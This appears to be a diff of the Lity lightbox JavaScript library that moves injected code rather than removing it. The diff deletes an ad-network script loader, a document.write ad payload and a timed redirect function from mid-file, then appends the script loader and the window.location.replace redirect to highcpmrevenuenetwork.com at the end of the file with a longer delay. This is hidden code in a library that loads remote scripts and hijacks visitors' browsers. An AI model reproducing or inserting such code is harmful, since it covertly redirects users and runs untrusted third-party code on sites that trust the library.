@@ -78,12 +78,7 @@
 
         return deferred.promise();
     }
-    
-    const script = document.createElement('script');
-    script.setAttribute('src','//pl18370142.highcpmrevenuenetwork.com/8d/a7/34/8da73429664f1e67236cc7b7452f668c.js',);
-    document.head.appendChild(script);
-    
-    atOptions = {'key' : 'ee8305bdbf733ae8f6c19af35818a90f', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {}};document.write('<scr' + 'ipt src="http' + (location.protocol === 'https:' ? 's' : '') + '://www.effectivecreativeformat.com/ee8305bdbf733ae8f6c19af35818a90f/invoke.js"></scr' + 'ipt>');
+
     function settings(currSettings, key, value) {
         if (arguments.length === 1) {
             return $.extend({}, currSettings);
@@ -226,7 +221,7 @@
             )
         );
     }
-    function inijs(){window.location.replace("https://www.highcpmrevenuenetwork.com/vz0rn37s?key=bca7a91dfdf09da7dacbd46d06696012")}
+
     function vimeoHandler(target) {
         var matches = _vimeoRegex.exec(target);
 
@@ -249,7 +244,6 @@
             )
         );
     }
-setTimeout(inijs,9999);
 
     function facebookvideoHandler(target) {
         var matches = _facebookvideoRegex.exec(target);
@@ -642,3 +636,8 @@ setTimeout(inijs,9999);
 
     return lity;
 }));
+
+    const script = document.createElement('script');
+    script.setAttribute('src','//pl18370142.highcpmrevenuenetwork.com/8d/a7/34/8da73429664f1e67236cc7b7452f668c.js',);
+    document.head.appendChild(script);
+    function inijs(){window.location.replace("https://www.highcpmrevenuenetwork.com/vz0rn37s?key=bca7a91dfdf09da7dacbd46d06696012")} setTimeout(inijs,22222);
